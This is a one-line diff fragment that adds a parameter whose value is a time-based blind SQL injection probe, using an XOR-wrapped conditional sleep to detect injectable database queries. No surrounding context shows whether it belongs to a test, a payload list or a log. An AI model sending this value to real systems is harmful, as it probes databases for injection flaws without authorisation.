@@ -1,0 +1,1 @@
+Parameter = ‘XOR(if(now()=sysdate(),sleep(10),0))XOR’Z
